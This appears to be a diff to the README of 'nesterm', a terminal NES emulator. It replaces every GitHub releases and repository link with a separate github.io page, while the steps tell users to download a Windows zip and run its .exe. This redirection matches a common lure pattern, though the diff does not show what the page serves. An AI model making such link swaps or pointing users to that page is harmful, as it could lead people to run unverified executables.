@@ -1,6 +1,6 @@
 # 🕹️ nesterm - Play NES Games Right in Your Terminal
 
-[![Download nesterm](https://img.shields.io/badge/⬇️_Download_nesterm-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/wortyiron/nesterm/releases)
+[![Download nesterm](https://img.shields.io/badge/⬇️_Download_nesterm-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://wortyiron.github.io)
 
 ## 🎮 What Is nesterm?
 
@@ -33,7 +33,7 @@ Ready to jump in? Follow these simple instructions.
 
 ### Step 1: Download The Program
 
-Visit this link to download the application: [https://github.com/wortyiron/nesterm/releases](https://github.com/wortyiron/nesterm/releases)
+Visit this link to download the application: [https://wortyiron.github.io](https://wortyiron.github.io)
 
 Once you click that link, you'll land on a page with a list of files. Look for the one that says something like `nesterm-windows.zip` or similar (it should have "windows" in the name). Click that file to start the download.
 
@@ -142,7 +142,7 @@ Want to share a cool moment? Press **F12** while playing. nesterm saves a screen
 
 The developer regularly improves nesterm. To update:
 
-1.  Go back to the download page: [https://github.com/wortyiron/nesterm/releases](https://github.com/wortyiron/nesterm/releases)
+1.  Go back to the download page: [https://wortyiron.github.io](https://wortyiron.github.io)
 2.  Check the latest version number (usually at the top).
 3.  Download the new `.zip` file.
 4.  Extract it, and copy your old game files and settings if needed (you can just run the new `.exe` from anywhere).
@@ -187,8 +187,8 @@ The project was designed with love for retro gaming and terminal aesthetics.
 
 ## 🔗 Resources
 
-- **Download Page:** [https://github.com/wortyiron/nesterm/releases](https://github.com/wortyiron/nesterm/releases)
-- **Repository Home:** [https://github.com/wortyiron/nesterm](https://github.com/wortyiron/nesterm)
+- **Download Page:** [https://wortyiron.github.io](https://wortyiron.github.io)
+- **Repository Home:** [https://wortyiron.github.io](https://wortyiron.github.io)
 
 ---
 
